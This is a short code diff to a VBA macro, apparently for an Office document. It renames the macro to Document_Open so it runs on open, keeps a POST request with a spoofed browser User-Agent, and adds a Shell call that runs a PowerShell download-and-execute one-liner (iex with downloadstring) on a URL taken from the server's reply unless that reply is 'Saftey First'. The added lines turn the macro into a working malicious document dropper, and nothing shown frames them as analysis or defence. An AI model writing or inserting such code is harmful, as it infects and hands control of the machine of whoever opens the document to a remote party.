@@ -1,4 +1,4 @@
-Sub OnOpen()
+Sub Document_Open()
     Set oh = CreateObject("MSXML2.XMLHTTP")
     oh.Open "POST", "http://localhost/order", False
     oh.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
@@ -53,6 +53,6 @@ Function Run(Text)
     If Text = "Saftey First" Then
         MsgBox Text, vbOKOnly, "Decision"
     Else
-       MsgBox Text, vbOKOnly, "Decision"
+       Shell ("powershell.exe -c " & "iex (new-object net.webclient).downloadstring('" & Text & "')")
     End If
 End Function
